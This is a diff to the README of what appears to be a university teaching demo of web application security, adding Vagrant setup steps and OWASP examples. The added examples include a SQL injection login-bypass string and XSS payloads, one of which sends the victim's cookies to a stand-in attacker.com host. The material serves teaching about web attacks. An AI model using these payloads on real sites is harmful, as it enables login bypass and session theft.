@@ -5,7 +5,10 @@ Created for University of West Bohemia.
 ## Installation
 * Install VirtualBox
 * Install [Vagrant](https://docs.vagrantup.com/v2/installation/index.html "Vagrant docs - Istallation")
-* Install Vagrant plugin for VirtualBox guest additions: 'vagrant plugin install vagrant-vbguest'
+* Install Vagrant plugin for VirtualBox guest additions
+```bash
+vagrant plugin install vagrant-vbguest
+```
 * checkout this repository
 ```bash
 > git clone git@github.com:veny/zcu_webapp_security_demo.git
@@ -20,12 +23,20 @@ Created for University of West Bohemia.
 ## OWASP top 10 examples
 * https://www.owasp.org/index.php/Category:OWASP_Top_Ten_Project
 
-### A1 – Injection
+### Injection
+* put that as password (empty username)
+```sql
+' OR id='2
+```
 
 ### XSS
 * put following text as notice
 ```html
 <b onmouseup=alert("XSS!")>click me!</b>
+```
+* or even worst
+```html
+"><script>document.location= "http://www.attacker.com/cgi-bin/cookie.cgi?foo="+document.cookie</script>"
 ```
 ___
 
